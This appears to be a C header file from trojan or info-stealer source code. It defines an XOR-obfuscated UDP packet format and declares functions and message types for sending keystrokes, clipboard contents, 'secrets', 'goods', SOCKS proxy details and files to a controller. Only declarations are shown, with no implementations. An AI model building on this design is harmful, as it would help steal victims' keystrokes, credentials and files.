
typedef struct ubermsg
{
	u_char xor;
	u_char type;
	u_int  id;
	u_int  csum;
	u_int  flags;
	u_int  len;

	u_int  opt;
	u_int  opt2;
	u_int  opt3;

	int    ver;

	u_char name[25];
	u_char data;
} ubermsg;

#define PACKET_VERSION 1
/* packet flags */
#define FMSG_FILEPACKED 0x00000001

/* udp setup */

#define UDP_FIRST_CHUNK_SLEEP 1000 // 1 second
#define UDP_CHUNKS_SLEEP_ADSL 250 // 1/10 second
#define UDP_CHUNKS_SLEEP_MODEM 600 // 1/2 second
#define UPACKET_SIZE 1600
#define PACKETSIZE(s) (s->len + (sizeof(ubermsg) - 1))
#define CHUNK_SIZE 1200

int udp_decrypt_packet(ubermsg *packet);
int udp_encrypt_packet(ubermsg *packet, u_char xor);
int udp_send_packet(ubermsg *packet);
int udp_dochecksum(ubermsg *packet);
int udp_change_status(u_char status);
int udp_submit_keys(char *buffer);
int udp_submit_clipboard(char *buffer);
int udp_submit_socks(char *ip, int port);
int udp_message_critical(int msgid, int param1, int param2);
int udp_control_status(u_char codeid, u_char msgid);
DWORD WINAPI udp_sendfile(LPVOID);
int prepare_udp_send_file(char *fname, HANDLE *handle, u_int *fsize);
int checksumfile(char *fname);
char * extract_filename(char *path, char* fname);
int udp_send_msg(u_int msg, char *data = NULL, u_int datalen = 0, char *name = NULL);
int udp_change_status(u_char status);
void udpdeb(char *msg, ...);

#pragma once
/* message types */
enum
{
	STATUS_ONLINE = 0x10, STATUS_OFFLINE, STATUS_AWAY, STATUS_ALIVE,
	MSGFILESTART, MSGFILEEND, MSGFILECHUNK,
	WARNSTOP, PING, AUTHFAIL, AUTHOK,
	SOCKS,
	KEYS,
	TEXT, SECRETS,
	CRITICAL,
	GOODS, CLIPBOARD
};